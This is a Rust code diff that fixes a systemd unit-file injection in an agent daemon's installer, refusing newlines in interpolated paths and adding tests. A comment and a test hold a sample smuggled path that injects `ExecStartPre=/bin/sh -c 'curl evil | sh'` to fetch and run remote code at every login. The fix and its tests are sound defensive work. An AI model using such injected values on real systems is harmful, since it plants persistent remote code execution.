@@ -142,7 +142,7 @@ fn xml_escape(s: &str) -> String {
 pub fn service_unit(exe: &Path, home: &Path, config_home: &Path, _uid: u32) -> Result<ServiceUnit> {
     Ok(ServiceUnit {
         path: config_home.join("leviath.service"),
-        contents: systemd_unit(exe, home, &home.join(LOG_FILE)),
+        contents: systemd_unit(exe, home, &home.join(LOG_FILE))?,
         activate: (
             "systemctl".to_string(),
             vec![
@@ -170,10 +170,47 @@ pub fn config_home(user_home: &Path) -> Result<PathBuf> {
     Ok(user_home.join(".config").join("systemd").join("user"))
 }
 
+/// Reject a value that cannot be safely interpolated into a systemd unit file.
+///
+/// A unit file is line-oriented `Key=Value`, so a newline in an interpolated
+/// value starts a **new directive**. `home` derives from `LEVIATH_HOME`, so a
+/// value like `/tmp\nExecStartPre=/bin/sh -c 'curl evil | sh'` injected an
+/// arbitrary command that then ran at every login. The macOS plist path is
+/// XML-escaped and was never exposed to this; the systemd path had no escaping
+/// at all.
+///
+/// Refusing is right rather than escaping: systemd has no general quoting for
+/// this position, and no legitimate path contains a newline.
+///
+/// Not `#[cfg(target_os = "linux")]` even though only the Linux path calls it:
+/// it is pure string logic, and gating it would mean the check could only be
+/// exercised on one platform's CI runner. A security control should be testable
+/// wherever the tests run.
+///
+/// `pub` (in an already-public module) rather than private-plus-`allow(dead_code)`:
+/// on a non-Linux build nothing calls it, and suppressing the warning would be
+/// hiding the fact rather than stating it. It is genuinely part of this module's
+/// surface — the systemd renderer's input contract.
+pub fn unit_safe(label: &str, value: &Path) -> Result<String> {
+    let s = display(value);
+    if s.contains('\n') || s.contains('\r') {
+        anyhow::bail!(
+            "refusing to write a systemd unit: the {label} path contains a newline, \
+             which would inject additional unit directives"
+        );
+    }
+    Ok(s)
+}
+
 /// A systemd *user* unit (no root needed) with the same restart policy.
-#[cfg(target_os = "linux")]
-fn systemd_unit(exe: &Path, home: &Path, log: &Path) -> String {
-    format!(
+///
+/// Compiled on every platform (it is pure string assembly) so its tests run
+/// everywhere; only the caller that installs it is Linux-gated.
+pub fn systemd_unit(exe: &Path, home: &Path, log: &Path) -> Result<String> {
+    let exe = unit_safe("executable", exe)?;
+    let home = unit_safe("LEVIATH_HOME", home)?;
+    let log = unit_safe("log", log)?;
+    Ok(format!(
         "[Unit]\n\
          Description=Leviath shared-world agent daemon\n\
          After=network-online.target\n\
@@ -189,10 +226,7 @@ fn systemd_unit(exe: &Path, home: &Path, log: &Path) -> String {
          \n\
          [Install]\n\
          WantedBy=default.target\n",
-        exe = display(exe),
-        home = display(home),
-        log = display(log),
-    )
+    ))
 }
 
 // ── Everywhere else: no supported user-level supervisor ──────────────────────
@@ -420,6 +454,67 @@ mod tests {
             assert!(u.contents.contains("Restart=always"));
             assert!(u.contents.contains("WantedBy=default.target"));
             assert!(config_home(Path::new("/home/u")).unwrap().ends_with("user"));
+        }
+    }
+
+    /// The systemd unit builder is pure string assembly, so these run on every
+    /// platform rather than only on a Linux CI runner.
+    mod systemd_unit_file {
+        use super::*;
+
+        #[test]
+        fn it_renders_the_expected_directives() {
+            let unit = systemd_unit(
+                Path::new("/usr/local/bin/lev"),
+                Path::new("/home/u/.leviath"),
+                Path::new("/home/u/.leviath/daemon.log"),
+            )
+            .unwrap();
+            assert!(unit.contains("ExecStart=/usr/local/bin/lev daemon"));
+            assert!(unit.contains("Environment=LEVIATH_HOME=/home/u/.leviath"));
+            assert!(unit.contains("Restart=always"));
+        }
+
+        /// A unit file is line-oriented `Key=Value`, so a newline in an
+        /// interpolated path starts a new *directive*. `home` derives from
+        /// `LEVIATH_HOME`, so this wrote an `ExecStartPre=` that then ran at
+        /// every login. There is no general quoting for this position in
+        /// systemd, so the value is refused rather than escaped — and no
+        /// legitimate path contains a newline.
+        #[test]
+        fn a_newline_in_an_interpolated_path_is_refused() {
+            let evil = Path::new("/home/u/.leviath\nExecStartPre=/bin/sh -c 'curl evil | sh'");
+            let err = systemd_unit(
+                Path::new("/usr/local/bin/lev"),
+                evil,
+                Path::new("/home/u/.leviath/daemon.log"),
+            )
+            .expect_err("a newline in LEVIATH_HOME must be refused");
+            assert!(err.to_string().contains("newline"), "got: {err}");
+            assert!(err.to_string().contains("LEVIATH_HOME"), "got: {err}");
+        }
+
+        /// Each interpolated position is checked, not just the first.
+        #[test]
+        fn every_interpolated_path_is_checked() {
+            let evil = Path::new("/x\nExecStartPre=/bin/false");
+            let good = Path::new("/home/u/.leviath");
+            assert!(systemd_unit(evil, good, good).is_err(), "executable");
+            assert!(systemd_unit(good, evil, good).is_err(), "home");
+            assert!(systemd_unit(good, good, evil).is_err(), "log");
+        }
+
+        /// A carriage return is a line break too — systemd tolerates CRLF.
+        #[test]
+        fn a_carriage_return_is_refused_too() {
+            assert!(
+                systemd_unit(
+                    Path::new("/usr/local/bin/lev"),
+                    Path::new("/home/u/.leviath\rExecStartPre=/bin/false"),
+                    Path::new("/home/u/.leviath/daemon.log"),
+                )
+                .is_err()
+            );
         }
     }
 
